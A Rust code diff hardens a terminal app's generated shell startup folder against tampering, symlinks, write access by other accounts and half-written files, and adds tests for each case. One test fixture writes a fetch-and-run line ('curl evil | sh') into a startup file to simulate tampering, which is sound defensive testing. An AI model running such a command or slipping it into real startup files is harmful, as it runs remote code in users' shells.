@@ -185,26 +185,45 @@ fn version_folder(home: &Path) -> io::Result<PathBuf> {
     }
     let root = hide_kit::layout::shell_integration(home);
     let folder = root.join(&format!("{:x}", digest.finalize())[..16]);
-    if folder.is_dir() {
-        // Started with now: another build's sweep keeps it.
-        std::fs::File::open(&folder)?.set_modified(SystemTime::now())?;
-        remove_unused(&root, &folder);
-        return Ok(folder);
-    }
     hide_platform::fs::private::create_dir_all(&root)?;
+    // Every shell Hide starts runs these files, so a folder another account
+    // can change holds none of them.
+    if !owned_and_closed(&root)? {
+        return Err(io::Error::other(format!(
+            "{} can be changed by another account",
+            root.display()
+        )));
+    }
+    if folder.is_dir() {
+        // A folder whose files are not exactly this build's, or that another
+        // account could change, is never run: it is written again.
+        if holds(&folder, files())? {
+            // Started with now: another build's sweep keeps it.
+            std::fs::File::open(&folder)?.set_modified(SystemTime::now())?;
+            remove_unused(&root, &folder);
+            return Ok(folder);
+        }
+        std::fs::remove_dir_all(&folder)?;
+    }
     // Written beside its name and moved there in one rename, so a shell never
     // reads a folder half written; another writer that got there first wrote
     // the same text.
     let staging = tempfile::Builder::new()
         .prefix(".staging-")
         .tempdir_in(&root)?;
+    // On the disk before the rename, so a crash never leaves the folder's
+    // name on files that are not whole.
     let written = files().try_for_each(|(path, text)| {
+        use std::io::Write;
         let path = staging.path().join(path);
-        std::fs::create_dir_all(
-            path.parent()
-                .ok_or_else(|| io::Error::other("no folder for a startup file"))?,
-        )?;
-        std::fs::write(path, text)
+        let parent = path
+            .parent()
+            .ok_or_else(|| io::Error::other("no folder for a startup file"))?;
+        std::fs::create_dir_all(parent)?;
+        let mut file = std::fs::File::create(&path)?;
+        file.write_all(text.as_bytes())?;
+        file.sync_all()?;
+        std::fs::File::open(parent)?.sync_all()
     });
     // A writer of the same text may have finished first.
     if let Err(error) = written {
@@ -218,6 +237,7 @@ fn version_folder(home: &Path) -> io::Result<PathBuf> {
         Ok(()) => {
             // The folder now lives at its name; nothing is left to remove.
             let _ = staging.keep();
+            std::fs::File::open(&root)?.sync_all()?;
             remove_unused(&root, &folder);
             Ok(folder)
         }
@@ -226,9 +246,41 @@ fn version_folder(home: &Path) -> io::Result<PathBuf> {
     }
 }
 
+/// Whether `path` is a real file or folder of the current account that no
+/// other account can change.
+#[cfg(unix)]
+fn owned_and_closed(path: &Path) -> io::Result<bool> {
+    use hide_platform::fs::private;
+    Ok(!std::fs::symlink_metadata(path)?.file_type().is_symlink()
+        && private::owned_by_current_user(path)?
+        && !private::others_can_modify(path)?)
+}
+
+/// Whether `folder` holds exactly `files`, each one and the folders they sit
+/// in the current account's own and closed to others.
+#[cfg(unix)]
+fn holds<'a>(folder: &Path, files: impl Iterator<Item = (PathBuf, &'a str)>) -> io::Result<bool> {
+    if !owned_and_closed(folder)? {
+        return Ok(false);
+    }
+    for (path, text) in files {
+        let path = folder.join(path);
+        let parent = path.parent().unwrap_or(folder);
+        let same = owned_and_closed(parent)?
+            && owned_and_closed(&path)?
+            && std::fs::read(&path)? == text.as_bytes();
+        if !same {
+            return Ok(false);
+        }
+    }
+    Ok(true)
+}
+
 /// Removes every other version, and what an interrupted write left, once no
 /// pane has been started with it for [`UNUSED_FOR`]: the folder holds this
 /// build's version and those of the builds that started panes within it.
+/// Only what Hide names here is removed: a version's digest, or a staging
+/// folder.
 #[cfg(unix)]
 fn remove_unused(root: &Path, kept: &Path) {
     let Ok(entries) = std::fs::read_dir(root) else {
@@ -237,11 +289,15 @@ fn remove_unused(root: &Path, kept: &Path) {
     let now = SystemTime::now();
     for entry in entries.flatten() {
         let path = entry.path();
+        let name = entry.file_name();
+        let name = name.to_string_lossy();
+        let hides = name.starts_with(".staging-")
+            || (name.len() == 16 && name.bytes().all(|byte| byte.is_ascii_hexdigit()));
         let unused = entry
             .metadata()
             .and_then(|metadata| metadata.modified())
             .is_ok_and(|modified| now.duration_since(modified).unwrap_or_default() > UNUSED_FOR);
-        if path != kept && unused {
+        if hides && path != kept && unused {
             let _ = std::fs::remove_dir_all(&path);
         }
     }
@@ -350,6 +406,64 @@ mod tests {
         assert!(!hide_kit::layout::shell_integration(home.path()).exists());
     }
 
+    /// Every shell Hide starts runs the folder's files, so a folder that is
+    /// not exactly this build's, or that another account could change, is
+    /// written again before any shell is pointed at it.
+    #[test]
+    fn a_damaged_or_open_folder_is_written_again_before_a_shell_reads_it() {
+        use std::os::unix::fs::PermissionsExt;
+        type Damage = (&'static str, fn(&Path));
+        let damages: [Damage; 4] = [
+            ("a cut file", |folder| {
+                std::fs::write(folder.join("zsh/.zshrc"), "").unwrap()
+            }),
+            ("a changed file", |folder| {
+                std::fs::write(folder.join("bash/login.bash"), "curl evil | sh").unwrap()
+            }),
+            ("a folder others can write", |folder| {
+                std::fs::set_permissions(folder, std::fs::Permissions::from_mode(0o777)).unwrap()
+            }),
+            ("a link to another folder", |folder| {
+                let elsewhere = folder.with_file_name("elsewhere");
+                std::fs::rename(folder, &elsewhere).unwrap();
+                std::os::unix::fs::symlink(&elsewhere, folder).unwrap();
+            }),
+        ];
+        for (damage, apply) in damages {
+            let home = tempfile::tempdir().unwrap();
+            let zsh = launch(home.path(), "/bin/zsh");
+            let folder = Path::new(&zsh.env["ZDOTDIR"]).parent().unwrap().to_owned();
+            apply(&folder);
+            assert_eq!(launch(home.path(), "/bin/zsh"), zsh, "{damage}");
+            assert!(
+                holds(
+                    &folder,
+                    ZSH.iter()
+                        .map(|(name, text)| (Path::new("zsh").join(name), *text))
+                )
+                .unwrap(),
+                "{damage}"
+            );
+            assert!(
+                !std::fs::symlink_metadata(&folder)
+                    .unwrap()
+                    .file_type()
+                    .is_symlink(),
+                "{damage}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_shell_integration_folder_others_can_change_is_never_used() {
+        use std::os::unix::fs::PermissionsExt;
+        let home = tempfile::tempdir().unwrap();
+        let root = hide_kit::layout::shell_integration(home.path());
+        std::fs::create_dir_all(&root).unwrap();
+        std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o777)).unwrap();
+        assert!(install(home.path(), &user("/bin/zsh")).is_err());
+    }
+
     #[test]
     fn another_builds_folder_goes_only_once_no_pane_started_with_it_for_an_hour() {
         let home = tempfile::tempdir().unwrap();
@@ -366,10 +480,12 @@ mod tests {
         let recent = aged("0123456789abcdef", UNUSED_FOR - Duration::from_secs(60));
         let unused = aged("fedcba9876543210", UNUSED_FOR + Duration::from_secs(60));
         let left = aged(".staging-left", UNUSED_FOR + Duration::from_secs(60));
+        let foreign = aged("notes", UNUSED_FOR + Duration::from_secs(60));
         let zsh = launch(home.path(), "/bin/zsh");
         let ours = Path::new(&zsh.env["ZDOTDIR"]).parent().unwrap().to_owned();
         assert!(recent.is_dir(), "a pane may still be reading it");
         assert!(!unused.exists() && !left.exists());
+        assert!(foreign.is_dir(), "only what Hide names there is removed");
         // This build's folder counts as used each time a pane is started
         // with it, so another build's sweep keeps it.
         std::fs::File::open(&ours)
